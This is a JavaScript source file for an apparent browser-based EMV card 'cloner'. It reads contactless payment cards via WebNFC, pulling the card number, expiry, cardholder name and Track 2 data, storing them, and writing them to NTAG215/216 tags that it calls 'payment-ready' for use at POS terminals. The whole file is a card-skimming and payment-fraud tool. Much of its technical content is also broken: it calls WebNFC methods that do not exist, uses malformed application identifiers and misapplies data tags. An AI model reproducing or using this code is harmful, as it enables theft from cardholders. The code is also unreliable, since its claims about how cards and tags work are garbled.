// Global variables
let nfcReader;
let currentCardData = null;

// Check NFC availability
async function checkNFC() {
    if (!('NDEFReader' in window)) {
        logMessage("[NFC] WebNFC NOT SUPPORTED (Chrome 89+ required)", "error");
        document.getElementById("nfcStatus").textContent = "[NFC: UNSUPPORTED]";
        return false;
    }
    document.getElementById("nfcStatus").textContent = "[NFC: AVAILABLE]";
    logMessage("[NFC] WebNFC supported", "success");
    return true;
}

// Scan EMV card (ISO 14443-4 Type A/B)
async function scanEMVCard() {
    if (!await checkNFC()) return;

    try {
        showNFCModal("Hold EMV card near device...");
        updateNFCProgress(10);
        nfcReader = new NDEFReader();
        await nfcReader.scan();

        logMessage("[NFC] Scanning for EMV card...", "info");
        updateNFCProgress(30);

        nfcReader.onreading = async (event) => {
            const tag = event.tag;
            logMessage(`[NFC] Tag detected (UID: ${arrayToHex(tag.id)})`, "info");
            updateNFCProgress(50);

            try {
                // Read EMV data
                currentCardData = await readEMVData(tag);
                logMessage(`[NFC] EMV data read successfully!`, "success");
                logMessage(`[DATA] PAN: ${currentCardData.pan}`, "data");
                logMessage(`[DATA] Expiry: ${currentCardData.expiry}`, "data");
                logMessage(`[DATA] UID: ${currentCardData.uid}`, "data");

                // Save to storage
                await saveCardData(currentCardData);
                updateClonedCount();
                
                updateNFCProgress(100);
                hideNFCModal();
            } catch (error) {
                logMessage(`[NFC] Error reading EMV data: ${error}`, "error");
                hideNFCModal();
            }
        };
    } catch (error) {
        logMessage(`[NFC] Scan error: ${error}`, "error");
        hideNFCModal();
    }
}

// Read EMV data (full APDU sequence)
async function readEMVData(tag) {
    // 1. Select PPSE (Payment System Environment)
    const ppse = await sendAPDU(tag, "00A404000E325041592E5359532E4444463031");
    if (!ppse || ppse.length < 2) throw new Error("PPSE selection failed");

    // 2. Select Visa/Mastercard Application
    let app;
    try {
        // Try Visa
        app = await sendAPDU(tag, "00A4040007A000000025010101");
    } catch (e) {
        // Try Mastercard
        app = await sendAPDU(tag, "00A4040007A0000000041010");
    }
    if (!app || app.length < 2) throw new Error("App selection failed");

    // 3. Read PDOL (Processing Data Object List)
    const pdol = await sendAPDU(tag, "80CA9F7F00");

    // 4. Get ATC (Application Transaction Counter)
    const atc = await sendAPDU(tag, "80CA9F5000");

    // 5. Get Cardholder Name (Tag 5F20)
    const name = await sendAPDU(tag, "80CA9F2000");

    // 6. Get PAN (Primary Account Number) (Tag 5A)
    const pan = await sendAPDU(tag, "80CA9F5A00");

    // 7. Get Expiry Date (Tag 5F24)
    const expiry = await sendAPDU(tag, "80CA9F2400");

    // 8. Get Track 2 Equivalent Data (Tag 57)
    const track2 = await sendAPDU(tag, "80CA9F5700");

    // Parse PAN and expiry from Track 2 if available
    let parsedPan = arrayToHex(pan);
    let parsedExpiry = arrayToHex(expiry);

    if (track2 && track2.length > 0) {
        const track2Str = arrayToHex(track2).replace(/\s/g, '');
        // Track 2 format: ;PAN=EXPIRY?SERVICE_CODE+DISCRETIONARY_DATA
        const panMatch = track2Str.match(/;([0-9]{13,19})=/);
        const expiryMatch = track2Str.match(/=([0-9]{4})/);

        if (panMatch) parsedPan = panMatch[1];
        if (expiryMatch) parsedExpiry = expiryMatch[1].substring(0, 2) + "/" + expiryMatch[1].substring(2);
    }

    return {
        uid: arrayToHex(tag.id),
        ppse: arrayToHex(ppse),
        app: arrayToHex(app),
        pdol: arrayToHex(pdol),
        atc: arrayToHex(atc),
        name: arrayToHex(name),
        pan: parsedPan,
        expiry: parsedExpiry,
        track2: arrayToHex(track2),
        timestamp: new Date().toISOString()
    };
}

// Clone EMV data to NTAG215/216 (ISO 14443-4 Type A emulation)
async function cloneToTag() {
    if (!currentCardData) {
        logMessage("[NFC] No card data to clone. Scan a card first.", "error");
        return;
    }

    if (!await checkNFC()) return;

    try {
        showNFCModal("Hold NTAG215/216 tag near device...");
        updateNFCProgress(10);
        nfcReader = new NDEFReader();
        await nfcReader.scan();

        logMessage("[NFC] Waiting for NTAG215/216 tag...", "info");
        updateNFCProgress(30);

        nfcReader.onreading = async (event) => {
            const tag = event.tag;
            logMessage(`[NFC] Tag detected (UID: ${arrayToHex(tag.id)})`, "info");
            updateNFCProgress(50);

            try {
                // Check if tag is NTAG215/216
                updateNFCProgress(60);
                const isValidTag = await checkTagType(tag);
                if (!isValidTag) {
                    logMessage("[NFC] Error: Tag is not NTAG215/216. Use a compatible tag.", "error");
                    hideNFCModal();
                    nfcReader.stopScan();
                    return;
                }

                // Write EMV data to tag
                updateNFCProgress(70);
                await writeEMVToType4Tag(tag, currentCardData);

                logMessage("[NFC] Cloning successful! Tag is now payment-ready.", "success");
                logMessage("[NFC] Test by tapping the tag on a POS terminal.", "info");
                
                updateNFCProgress(100);
                hideNFCModal();
                nfcReader.stopScan();
            } catch (error) {
                logMessage(`[NFC] Cloning failed: ${error}`, "error");
                hideNFCModal();
                nfcReader.stopScan();
            }
        };
    } catch (error) {
        logMessage(`[NFC] Error: ${error}`, "error");
        hideNFCModal();
    }
}

// Check if tag is NTAG215/216
function checkTagType(tag) {
    // NTAG215/216 typically have 7-byte UIDs
    const uid = arrayToHex(tag.id);
    return uid.length >= 14; // 7 bytes = 14 hex chars
}

// Write EMV data to Type 4 tag (NTAG215/216)
async function writeEMVToType4Tag(tag, cardData) {
    // 1. Select PPSE (Payment System Environment)
    await sendAPDU(tag, "00A404000E325041592E5359532E4444463031");

    // 2. Select Visa/Mastercard Application
    await sendAPDU(tag, "00A4040007A000000025010101"); // Visa
    // await sendAPDU(tag, "00A4040007A0000000041010"); // Mastercard

    // 3. Write PAN (Track 2 Equivalent Data)
    const panHex = cardData.pan.replace(/\s/g, '');
    const expiryHex = cardData.expiry.replace(/\//g, '');
    const track2Data = `;${panHex}=${expiryHex}?`; // Simplified Track 2 format
    const track2Bytes = new TextEncoder().encode(track2Data);

    // Write to tag memory (simplified for NTAG215/216)
    await sendAPDU(tag, "A2040000" + bytesToHex(track2Bytes));

    logMessage(`[NFC] EMV data written to tag (PAN: ${cardData.pan})`, "success");
}

// Send raw APDU command to tag
async function sendAPDU(tag, apduHex) {
    const apdu = hexToBytes(apduHex);
    const response = await tag.transceive(apdu);
    if (response.length < 2) {
        throw new Error(`APDU ${apduHex} failed (response: ${arrayToHex(response)})`);
    }
    // Check for error (SW1=0x90, SW2=0x00 means success)
    if (response[response.length - 2] !== 0x90 || response[response.length - 1] !== 0x00) {
        throw new Error(`APDU ${apduHex} returned error: ${arrayToHex(response.slice(-2))}`);
    }
    return response.slice(0, -2); // Remove SW1/SW2
}

// Helper: Hex to Bytes
function hexToBytes(hex) {
    return new Uint8Array(hex.match(/.{1,2}/g).map(h => parseInt(h, 16)));
}

// Helper: Array to Hex
function arrayToHex(arr) {
    return Array.from(arr).map(b => b.toString(16).padStart(2, '0')).join(' ');
}

// Helper: Bytes to Hex
function bytesToHex(bytes) {
    return Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
}

// Show NFC modal
function showNFCModal(message) {
    const modal = document.getElementById("nfcModal");
    const modalText = document.getElementById("nfcModalText");
    modalText.textContent = message;
    modal.style.display = "flex";
}

// Hide NFC modal
function hideNFCModal() {
    const modal = document.getElementById("nfcModal");
    modal.style.display = "none";
    if (nfcReader) {
        nfcReader.stopScan();
    }
}

// Update NFC progress
function updateNFCProgress(percent) {
    document.getElementById("nfcProgress").style.width = `${percent}%`;
}

// Update cloned count in UI
async function updateClonedCount() {
    const count = await countCards();
    document.getElementById("clonedCount").textContent = count;
}
